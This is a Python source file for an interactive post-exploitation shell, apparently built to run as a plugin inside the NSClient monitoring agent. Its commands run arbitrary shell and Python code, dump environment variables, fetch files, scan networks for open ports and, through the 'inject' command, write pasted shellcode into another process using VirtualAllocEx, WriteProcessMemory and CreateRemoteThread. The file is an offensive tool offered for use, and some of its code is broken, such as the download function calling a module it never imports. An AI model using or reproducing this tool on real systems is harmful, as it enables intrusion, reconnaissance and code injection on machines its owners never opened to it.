import os, sys, tempfile


# Set python home to a path we can definitely write to so we can do pip installs
pythondir = os.path.join(tempfile.gettempdir(),'python' + str( sys.version_info[0] ))
downloadsdir = os.path.join(tempfile.gettempdir(),'downloads')

if sys.version_info[0] == 2: input = raw_input

print('pythondir',pythondir)
try:
  importdir = os.path.join( pythondir, 'lib', 'site-packages' )
  cachedir  = os.path.join(pythondir,'cache')
  logfile   = os.path.join(tempfile.gettempdir(),'shell.log')

  if 'PYTHONHOME' not in os.environ: os.environ['PYTHONHOME'] = ''
  os.environ['PYTHONHOME'] += ';.;' + pythondir + ';' + importdir
  sys.path.append(importdir)
  sys.path.append('.')
  open_ports = []
except Exception as e:
  print(e)

# These ones should all work
try:
  import subprocess,shutil,base64,re,getpass,fnmatch,time,getopt,socket
except Exception as e:
  print( e )

# Support for multithreading
try:
  import threading,queue
except Exception as e:
  print( e )
  print('No multithreading support :( nmap will be slow')

# CIDR parsing
try:
  import ipaddress
except Exception as e:
  print( e )
  print('No IP address module - unable to parse CIDR notation')

# Package management
try:
  import pip
except Exception as e:
  print( e )
  print('No pip - install won\'t work')

# Web requests
try:
  from urllib.request import urlopen
except Exception as e:
  print( e )
  try:
    from urllib import urlopen
  except Exception as f:
    print( f )
    print('No urlopen - wget won\'t work')

# Processes
try: 
  import psutil
except Exception as e:
  print( e )
  print('No psutil - ps, ifconfig and netstat won\'t work')

# Windows kernel
try:
  from ctypes import *
except Exception as e:
  print( e )
  print('No ctypes - inject won\'t work')

commands = {
  'help': 'Show help',
  'info': 'Show info about current system',
  'cd': 'Change current working dir',
  'ls': 'List files / folders',
  'cat': 'Output a file to stdout',
  'bat': 'base64 output a file to stdout',
  'cp': 'Copy a file / folder',
  'mv': 'Move a file / folder',
  'rm': 'Delete a file / folder',
  'exec': 'Execute a system command / binary',
  'edit': 'Open the OS editor on a file',
  'grep': 'Recursive grep for a regex (equivalent to `grep -ori <pattern>`)',
  'python': 'Run the python interpreter against a file',
  'eval': 'Evaluate some python code',
  'install': 'pip install a module',
  'find': 'Recursive find for a glob filename',
  'wget': 'Download a file to cwd',
  'nmap': 'Basic multithreaded TCP port scanner',
  'ps':   'List running processes',
  'netstat': 'List network connections',
  'ifconfig': 'Print network interfaces',
  'inject': 'Inject shellcode into a process id'
}

def shell():
  print('Starting shell')
  out = do_info([])
  print( out )
  log( 'info', out )
  print('Type `help` for all commands available')
  print('Logging all commands and output to ' + logfile)
  while True:
    try:
      cmd = input(os.getcwd() + "> ").strip()
      out = parse_command( cmd )
      if out: print( out )
    except Exception as e:
      print("FAILED:",cmd, e)
      out = str(e)
    log( cmd, out )

def log( command, output ):
  if not output: output = ''
  try:
    with open( logfile,'a') as f:
      f.write('\nCWD: '+os.getcwd()+'\nIN: '+command+'\nOUT: '+output)
  except:
    pass

def parse_command( cmd ):
  parts = cmd.split(' ')
  command = parts[0].strip()
  if len( command ) == 0: return
  if command in commands:
    try:
      out = globals()['do_'+command](parts)
    except Exception as e:
      print('Running ' + command + ' failed:',e)
      out = ''
      
  else:
    out = ''
    print('Don\'t know how to ' + command)
  return out

def resolve_path( parts ):
  if len( parts ) < 2:
    d = os.getcwd()
  elif parts[1].startswith('/'):
    d = ' '.join(parts[1:]).strip()
  else:
    d = os.path.join( os.getcwd(), os.path.join(' '.join(parts[1:]).strip()) )
  print(d)
  return d

def do_help( parts ):
  for k,v in commands.items():
    print(k.ljust(10)+': '+v)

def do_info( parts ):
  colwidth = 20
  

  rtn = 'Python'.ljust(colwidth) + ': ' + sys.version + '\n'

  # whoami
  rtn += 'User'.ljust(colwidth)+': ' + getpass.getuser() + '@' + socket.gethostname() + '\n'

  # Env vars
  rtn += '\nEnvironment Variables:\n'
  for k,v in os.environ.items():
    rtn += k.ljust(colwidth) + ': ' + v + '\n'
  return rtn

def do_cd( parts ):
  if len( parts ) < 2:
    os.chdir(os.path.dirname(__file__))
  else:
    os.chdir(' '.join(parts[1:]))

def do_ls( parts ):
  d = resolve_path( parts )
  rtn = ''
  for f in os.listdir( d ):
    fn = os.path.join( d, f )
    if os.path.isfile( fn ):
      rtn += '\n' + str(os.path.getsize( fn )).rjust(10)
    else:
      rtn += '\n' + 'd'.rjust(10)
    rtn += ' ' + time.ctime( os.path.getmtime(fn) ) + ' ' + f
  return rtn

def do_cat( parts ):
  d = resolve_path( parts )
  with open( d, 'r' ) as f:
    return f.read()

def do_bat( parts ):
  d = resolve_path( parts )
  with open( d, 'rb' ) as f:
    return base64.b64encode( f.read() )

def do_cp( parts ):
  if len( parts ) < 3:
    print('cp <source> <dest>')
    return
  source = resolve_path( ['',parts[1]] )
  dest = resolve_path( ['',parts[2]] )
  shutil.copy(source,dest)
  
def do_mv( parts ):
  if len( parts ) < 3:
    print('mv <source> <dest>')
    return
  source = resolve_path( ['',parts[1]] )
  dest = resolve_path( ['',parts[2]] )
  shutil.move(source,dest)

def do_rm( parts ):
  f = resolve_path( parts )
  os.remove(f)

def do_exec( parts ):
  f = resolve_path( parts )
  return subprocess.check_output(parts[1:])

def do_grep( parts ):
  if len( parts ) == 1: return ''
  pattern = parts[1]
  if len( parts ) == 2: 
    d = '.'
  else:
    d = resolve_path(parts[1:])
  if os.path.isfile( d ):
    return grep( d, pattern )
  rtn = ''
  for root, dirs, files in os.walk(d):
    for name in files:
      fn = os.path.join( root, name )
      rtn += grep(fn,pattern)
  return rtn

def grep( file, pattern ):
  try:
    with open( file, 'r' ) as f:
      buf = f.read()
    m = re.findall( pattern, buf, re.I )
    if len( m ) == 0: return ''
    rtn = '\n' + '\n'.join([ file + ': ' + x for x in m])
    return rtn
  except Exception as e:
    return ''

def do_python( parts ):
  parts[0] = sys.executable
  print( parts )
  print( os.environ['PYTHONHOME'] )
  try:
    return subprocess.run( parts, capture_output=True )
  except Exception as e:
    return str(e)

def do_eval( parts ):
  code = ' '.join(parts[1:])
  try:
    exec(code)
  except Exception as e:
    print(e)
  return ''

def do_install( parts ):
  package = parts[1]
  pip.main(['install','--cache-dir',cachedir,'--prefix',pythondir,'--upgrade',package])
  return ''

def do_find( parts ):
  if len( parts ) == 1: return ''
  pattern = parts[1]
  if len( parts ) == 2: 
    d = '.'
  else:
    d = resolve_path(parts[1:])
  rtn = ''
  for root, dirs, files in os.walk(d):
    for name in fnmatch.filter( files, pattern ):
      fn = os.path.join( root, name )
      rtn += '\n' + fn
  return rtn

def do_wget( parts ):
  if len( parts ) == 1: return ''
  url = '%20'.join(parts[1:])
  outfile = os.path.basename(url).strip()
  if outfile == '': outfile = 'download'
  outfile = os.path.join(downloadsdir,outfile)
  r = urllib.request.urlopen(url)
  with open( outfile, 'wb' ) as f: f.write(r.read())
  return outfile

def do_nmap( parts ):
  if len( parts ) == 1:
    return 'Usage: nmap -p 21-80,443 192.168.1.0/24,192.168.0.30'
  args = {'target':parts[-1]}
  for a in getopt.getopt( parts[1:], 'p:t:' )[0]:
    args[a[0][1]] = a[1]

  # Expand port ranges
  if 'p' in args: ports = mixrange(args['p'])

  # Default ports
  else: ports = '80,443,445,21,22,23,389,636,25,110,53,3389,3306,8080,587,8888,81,8443,8000,1433,139,143,135,1723,111,995,993,5900,1025,199,1720,465,548,113,6001,10000,514,5060,179,1026,2000,32768,554,26,49152,2001,515,8008'.split(',')

  # Threads
  if 't' in args: max_threads = int(args['t'])
  else: max_threads = 20

  # Parse target
  ips = []
  for t in args['target'].split(','):
    
    # hostname
    if re.search('[a-z]',t):
      ips.append(socket.gethostbyname(t))
      continue

    # CIDR
    if re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d{1,2}',t):
      net=ipaddress.ip_network(t)
      for ip in net: ips.append(str(ip))
      continue
    
    # Range in last octet
    m = re.search('(\d{1,3}\.\d{1,3}\.\d{1,3}\.)(\d{1,3})\s*-\s*(\d+)',t)
    if m:
      for i in range(int(m.group(2)),int(m.group(3))+1):
        ips.append(m.group(1)+str(i))
      continue

    # Single IP
    if re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',t):
      ips.append(t)
      continue

  # Create target services, IP wide first
  try:
    targets = queue.Queue()
    for ip in ips:
      for port in ports:
        targets.put((ip,port))

    open_ports = []
   
    def scanner():
      while True:
        target = targets.get()
        scan_port( target[0], target[1] )
        targets.task_done()
  except:
    print('Multithreading failed, attempting single threaded scan...')
    for ip in ips:
      for port in ports:
        scan_port(ip,port)

  def scan_port( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    port = int( port )
    result = s.connect_ex((ip,port))
    if result == 0:
      print('OPEN:',ip+':'+str(port))
      open_ports.append((ip,port))
    s.close()

  # Multithreading
  for i in range(max_threads):
    threading.Thread(target=scanner, daemon=True).start()
  targets.join()

  return 'Open ports found:\n' + '\n'.join([x[0]+':'+str(x[1]) for x in open_ports])

def mixrange(s):
  r = []
  for i in s.split(','):
    if '-' not in i:
      r.append(int(i))
    else:
      l,h = map(int, i.split('-'))
      print(l,h)
      r+= range(l,h+1)
  return r

def do_ps( parts ):
  fields = 'pid,ppid,username,cmdline'.split(',')
  s = ''
  for p in psutil.process_iter(fields):
    d = p.as_dict()
    s += '\n'
    for f in fields:
      s += str(d[f]).ljust(10)
  return s

def do_netstat( parts ):
  s = ''
  for n in psutil.net_connections():
    s += '\n' + (n.laddr.ip + ':' + str( n.laddr.port )).ljust(20) 
    if n.raddr:
      s+= (n.raddr.ip + ':' + str( n.raddr.port )).ljust(20)
    else: s+= ' '*20
    s += n.status.ljust(20) + str(n.pid)
  return s

def do_ifconfig( parts ):
  addrs = psutil.net_if_addrs()
  s = ''
  for iface,inf in addrs.items():
    s += '\n' + iface + ':\n'
    for i in inf:
      s += '  Address: ' + str( i.address ) + '\n'
      s += '  Netmask: ' + str( i.netmask ) + '\n'
  return s

def do_inject( parts ):
  
  # Thank you, Chris https://www.christophertruncer.com/injecting-shellcode-into-a-remote-process-with-python/

  if len( parts ) < 2:
    print('shellcode <pid>')
    return

  process_id = int( parts[1] )
  page_rwx_value = 0x40
  process_all = 0x1F0FFF
  memcommit = 0x00001000
  kernel32_variable = windll.kernel32
  shellcode = base64.b64decode(input('Paste in shellcode in base64: '))
  shellcode_length = len(shellcode)
  process_handle = kernel32_variable.OpenProcess(process_all, False, process_id)
  memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
  kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, shellcode_length, 0)
  kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)

# To run inside nsclient

def init(plugin_id, plugin_alias, script_alias ):
  pass

def shutdown( args ):
  pass

def __main__( args ):
  shell()
  
  print('Falling back to python REPL')
  import code
  code.InteractiveConsole(locals=globals()).interact()

if __name__ == '__main__':
  __main__([])


